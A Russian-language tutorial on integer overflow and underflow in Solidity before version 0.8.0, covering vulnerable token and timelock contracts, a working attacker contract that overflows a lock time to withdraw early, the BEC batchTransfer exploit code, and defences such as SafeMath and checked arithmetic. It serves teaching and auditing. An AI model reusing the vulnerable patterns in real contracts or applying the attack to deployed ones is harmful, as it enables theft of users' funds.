# Overflow/Underflow (Арифметическое переполнение)

Overflow (переполнение) и Underflow (недополнение) — это арифметические уязвимости, возникающие при выходе числовых значений за границы допустимого диапазона типа данных. В Solidity версий до 0.8.0 эти ошибки не вызывали исключений, что позволяло злоумышленникам манипулировать балансами и обходить проверки безопасности.

## Механизм уязвимости

### Что такое Overflow?

Overflow происходит, когда результат арифметической операции превышает максимальное значение типа данных. В этом случае значение "перекручивается" обратно к минимальному.

```
uint8 максимум = 255 (2^8 - 1)

255 + 1 = 0 (вместо 256)
255 + 10 = 9 (вместо 265)
```

### Что такое Underflow?

Underflow происходит, когда результат операции меньше минимального значения типа. Значение "перекручивается" к максимальному.

```
uint8 минимум = 0

0 - 1 = 255 (вместо -1)
0 - 10 = 246 (вместо -10)
```

### Визуализация

```
                    Overflow
                       ↓
    0 ←─────────────────────────────── 255
    │                                   │
    │         uint8 диапазон            │
    │         (0 to 255)                │
    │                                   │
    0 ───────────────────────────────→ 255
                       ↑
                   Underflow
```

## Уязвимый код (Solidity < 0.8.0)

### Пример 1: Манипуляция балансом

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0; // Уязвимая версия!

// УЯЗВИМЫЙ КОНТРАКТ - НЕ ИСПОЛЬЗОВАТЬ!
contract VulnerableToken {
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) external {
        // УЯЗВИМОСТЬ: Underflow при balances[msg.sender] < amount
        // Если баланс = 100, а amount = 101:
        // 100 - 101 = очень большое число (2^256 - 1)
        require(balances[msg.sender] - amount >= 0, "Insufficient"); // Всегда true!

        balances[msg.sender] -= amount;
        balances[to] += amount;
    }

    // Правильная проверка должна быть:
    // require(balances[msg.sender] >= amount, "Insufficient");
}
```

### Пример 2: Обход лимита времени

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

// УЯЗВИМЫЙ КОНТРАКТ
contract VulnerableTimelock {
    mapping(address => uint256) public lockTime;
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    // УЯЗВИМОСТЬ: Overflow при увеличении времени блокировки
    function increaseLockTime(uint256 _seconds) external {
        // Если lockTime = X и _seconds подобран так, что
        // X + _seconds > 2^256, результат станет очень маленьким числом
        lockTime[msg.sender] += _seconds;
    }

    function withdraw() external {
        require(balances[msg.sender] > 0, "No funds");
        require(block.timestamp > lockTime[msg.sender], "Still locked");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

### Контракт атакующего

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface IVulnerableTimelock {
    function deposit() external payable;
    function increaseLockTime(uint256 _seconds) external;
    function withdraw() external;
    function lockTime(address) external view returns (uint256);
}

contract TimelockAttacker {
    IVulnerableTimelock public target;

    constructor(address _target) {
        target = IVulnerableTimelock(_target);
    }

    function attack() external payable {
        // 1. Делаем депозит
        target.deposit{value: msg.value}();

        // 2. Вычисляем значение для overflow
        // Нужно: lockTime + x = 0 (или очень маленькое число)
        // x = 2^256 - lockTime
        uint256 currentLockTime = target.lockTime(address(this));
        uint256 overflowValue = type(uint256).max - currentLockTime + 1;

        // 3. Вызываем overflow
        target.increaseLockTime(overflowValue);

        // 4. Теперь lockTime = 0, можем вывести сразу
        target.withdraw();
    }

    receive() external payable {}
}
```

## Реальные атаки

### BeautyChain (BEC) Token — April 2018

Злоумышленник эксплуатировал overflow в функции `batchTransfer`:

```solidity
// Уязвимый код BEC Token
function batchTransfer(address[] _receivers, uint256 _value) public returns (bool) {
    // УЯЗВИМОСТЬ: overflow при умножении
    // Если _receivers.length = 2 и _value = 2^255
    // amount = 2 * 2^255 = 2^256 = 0 (overflow!)
    uint256 amount = uint256(_receivers.length) * _value;

    require(_value > 0 && balances[msg.sender] >= amount);

    balances[msg.sender] -= amount; // Вычитаем 0

    for (uint256 i = 0; i < _receivers.length; i++) {
        balances[_receivers[i]] += _value; // Каждый получает 2^255 токенов!
    }

    return true;
}
```

**Результат**: Атакующий создал из ниоткуда токены на триллионы долларов, обрушив цену токена практически до нуля.

### PoWH Coin (Proof of Weak Hands) — 2018

Overflow при продаже токенов позволил красть ETH из пула.

## Способы защиты

### 1. Использование Solidity 0.8.0+

Начиная с версии 0.8.0, Solidity автоматически проверяет overflow/underflow:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SafeMath {
    function add(uint256 a, uint256 b) external pure returns (uint256) {
        // Автоматически вызовет revert при overflow
        return a + b;
    }

    function sub(uint256 a, uint256 b) external pure returns (uint256) {
        // Автоматически вызовет revert при underflow
        return a - b;
    }
}
```

### Использование unchecked для оптимизации газа

Если вы уверены, что overflow невозможен, можно отключить проверки:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract OptimizedCounter {
    uint256 public counter;

    // Безопасно, так как counter никогда не превысит uint256
    function increment() external {
        unchecked {
            counter++; // Экономит ~100 gas
        }
    }

    // ОПАСНО! Используйте только когда точно уверены
    function unsafeAdd(uint256 a, uint256 b) external pure returns (uint256) {
        unchecked {
            return a + b; // Может overflow!
        }
    }
}
```

### 2. SafeMath Library (для Solidity < 0.8.0)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction underflow");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
}

contract SafeToken {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) external {
        // Безопасное вычитание — revert при underflow
        balances[msg.sender] = balances[msg.sender].sub(amount);
        // Безопасное сложение — revert при overflow
        balances[to] = balances[to].add(amount);
    }
}
```

### 3. OpenZeppelin SafeMath

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract MyToken {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        totalSupply = totalSupply.add(amount);
        balances[to] = balances[to].add(amount);
    }

    function burn(address from, uint256 amount) external {
        balances[from] = balances[from].sub(amount, "Burn amount exceeds balance");
        totalSupply = totalSupply.sub(amount);
    }
}
```

## Типы данных и их диапазоны

| Тип | Минимум | Максимум |
|-----|---------|----------|
| uint8 | 0 | 255 |
| uint16 | 0 | 65,535 |
| uint32 | 0 | 4,294,967,295 |
| uint64 | 0 | 18,446,744,073,709,551,615 |
| uint128 | 0 | 340,282,366,920,938,463,463,374,607,431,768,211,455 |
| uint256 | 0 | ~1.16 × 10^77 |
| int8 | -128 | 127 |
| int256 | -2^255 | 2^255 - 1 |

### Получение границ в коде

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TypeBounds {
    function getUint8Bounds() external pure returns (uint8 min, uint8 max) {
        return (type(uint8).min, type(uint8).max);
    }

    function getInt256Bounds() external pure returns (int256 min, int256 max) {
        return (type(int256).min, type(int256).max);
    }

    function getUint256Max() external pure returns (uint256) {
        return type(uint256).max;
        // = 115792089237316195423570985008687907853269984665640564039457584007913129639935
    }
}
```

## Signed Integer Overflow

Для знаковых целых чисел overflow также опасен:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SignedOverflow {
    // int8 диапазон: -128 to 127

    function unsafeNegate() external pure returns (int8) {
        int8 x = -128;
        unchecked {
            return -x; // -(-128) = 128, но int8 max = 127 → overflow!
        }
        // В Solidity 0.8+ это вызовет revert
        // В unchecked блоке вернёт -128
    }

    function safeNegate(int8 x) external pure returns (int8) {
        require(x != type(int8).min, "Cannot negate minimum value");
        return -x;
    }
}
```

## Best Practices

### 1. Используйте Solidity 0.8.0+

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20; // Всегда используйте актуальную версию
```

### 2. Правильный порядок проверок

```solidity
// ПРАВИЛЬНО
function transfer(address to, uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    balances[msg.sender] -= amount;
    balances[to] += amount;
}

// НЕПРАВИЛЬНО
function transferBad(address to, uint256 amount) external {
    require(balances[msg.sender] - amount >= 0, "..."); // Бессмысленно для uint
}
```

### 3. Осторожно с unchecked

```solidity
// Безопасно — индекс в цикле
function sum(uint256[] calldata arr) external pure returns (uint256 total) {
    for (uint256 i = 0; i < arr.length;) {
        total += arr[i]; // Может overflow, оставьте checked
        unchecked { ++i; } // Безопасно, i < arr.length
    }
}

// ОПАСНО — пользовательский ввод
function unsafeCalc(uint256 a, uint256 b) external pure returns (uint256) {
    unchecked {
        return a * b; // Никогда не делайте так с внешними данными!
    }
}
```

### 4. Проверяйте мультипликативные операции

```solidity
function safeBatchTransfer(
    address[] calldata receivers,
    uint256 value
) external {
    uint256 totalAmount = receivers.length * value;
    // В 0.8+ автоматически проверится overflow

    require(balances[msg.sender] >= totalAmount, "Insufficient balance");

    balances[msg.sender] -= totalAmount;
    for (uint256 i = 0; i < receivers.length;) {
        balances[receivers[i]] += value;
        unchecked { ++i; }
    }
}
```

### 5. Используйте специальные библиотеки для фиксированной точки

```solidity
// Для работы с дробными числами используйте проверенные библиотеки
// PRBMath, ABDKMath64x64, Solmate's FixedPointMathLib
```

## Тестирование

### Foundry тест на overflow

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract OverflowTest is Test {
    function testOverflowReverts() public {
        uint256 max = type(uint256).max;

        // Должен вызвать revert
        vm.expectRevert();
        uint256 result = max + 1;
    }

    function testUncheckedOverflow() public {
        uint256 max = type(uint256).max;

        unchecked {
            uint256 result = max + 1;
            assertEq(result, 0); // Wrapped around to 0
        }
    }

    function testSafeTransfer() public {
        uint256 balance = 100;
        uint256 amount = 101;

        // Проверка баланса
        vm.expectRevert("Insufficient balance");
        // transfer(amount) when balance < amount
    }
}
```

## Checklist безопасности

- [ ] Используется Solidity 0.8.0 или выше
- [ ] Для старых версий применяется SafeMath
- [ ] Проверки баланса выполняются до арифметических операций
- [ ] `unchecked` используется только в безопасных сценариях
- [ ] Тесты проверяют граничные случаи
- [ ] Мультипликативные операции проверены на overflow

## Заключение

Overflow и underflow были одними из самых распространённых уязвимостей до Solidity 0.8.0. Современные версии компилятора автоматически защищают от этих атак, но разработчикам всё равно важно:

1. Понимать механизм уязвимости для аудита старого кода
2. Правильно использовать `unchecked` блоки для оптимизации
3. Писать тесты на граничные случаи
4. Быть особенно внимательными при работе с внешними данными

Помните: каждая арифметическая операция — потенциальный вектор атаки. Даже с автоматической защитой, понимание overflow/underflow остаётся фундаментальным навыком безопасной разработки смарт-контрактов.
